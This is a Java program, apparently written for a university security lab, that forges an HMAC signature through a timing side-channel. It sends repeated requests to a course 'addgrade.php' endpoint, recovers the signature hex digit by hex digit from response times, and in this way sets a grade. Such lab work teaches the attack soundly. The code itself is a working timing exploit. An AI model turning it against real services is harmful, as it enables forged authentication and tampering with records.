package main;

import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.StringSelection;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;

public class GradeHack {
	
	String signature;
	String pChar;
	String url;
	long longestResponse;
	
	public GradeHack(String name, String grade) {
		String[] alphanumeric = { "0", "1", "2", "3", "4", "5", "6", "7", "8",
				"9", "a", "b", "c", "d", "e", "f" };
		signature = "";
		long timetime = System.currentTimeMillis();
		url = "https://eitn41.eit.lth.se:3119/ha4/addgrade.php?";
		url += "name=" + name + "&grade=" + grade;
		try {
			for (int j = 0; j < 20; j++) {
				pChar = "";
				longestResponse = 0;
				for (int i = 0; i < 16; i++) {
					characterGuess(alphanumeric[i]);
				}
				signature += pChar;

			}
			System.out.println("Signaturen: " + signature);		
			
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		long time3 = System.currentTimeMillis() - timetime;
		System.out.println("Det tog " + time3 / 60000 + " minuter! (" + time3 + " ms)");
	}

	private String characterGuess(String sChar) throws UnsupportedEncodingException, IOException {
		int it = 0;
		long response = Long.MAX_VALUE;
		String tempsig = signature;
		tempsig += sChar;
		while (it < 5) {
			String urlTest = url + "&signature=" + tempsig;
			URL u = new URL(urlTest);
			long startTime = System.nanoTime();
			URLConnection uc = u.openConnection();
			BufferedReader br = new BufferedReader(
					new InputStreamReader(uc.getInputStream(),
							"UTF-8"));
			String line;
			while ((line = br.readLine()) != null) {
				if (line.equals("1")) {
					System.out.println("CRACKED");
				}
			}
			long responseTime = System.nanoTime() - startTime;
			if (responseTime < response) {
				response = responseTime;
				System.out.println("Response: " + response);
			}
			it++;
		}
		
		System.out.println("Responstid på " + tempsig + " var "
				+ response);
		// Kollar om responstiden på det här talet var längre än
		// tidigare tal
		if (response > longestResponse) {
			long diff = response - longestResponse;
			System.out.println("Diff: " + diff
					+ " när tempsig var: " + tempsig + " och bokstaven var: " + sChar);

			System.out.println("2.");
			pChar = sChar;
			longestResponse = response;

		}
		return pChar;
		
	}
	private String printByteArray(byte[] array) {
		String s = "";
		for (int i = 0; i < array.length; i++) {
			s += String.format("%02x", array[i]);

		}
		System.out.println(s + " " + array.length + " bytes ");
		return s;
	}

	public static void main(String[] args) {
		GradeHack gh = new GradeHack("Kalle", "5");
	}
}
